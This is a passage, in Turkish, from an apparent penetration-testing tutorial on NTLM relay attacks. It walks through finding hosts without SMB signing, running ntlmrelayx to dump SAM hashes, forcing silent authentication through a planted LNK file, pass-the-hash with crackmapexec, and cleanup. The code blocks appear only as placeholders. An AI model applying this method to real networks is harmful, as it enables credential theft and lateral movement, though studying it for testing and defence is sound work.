Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}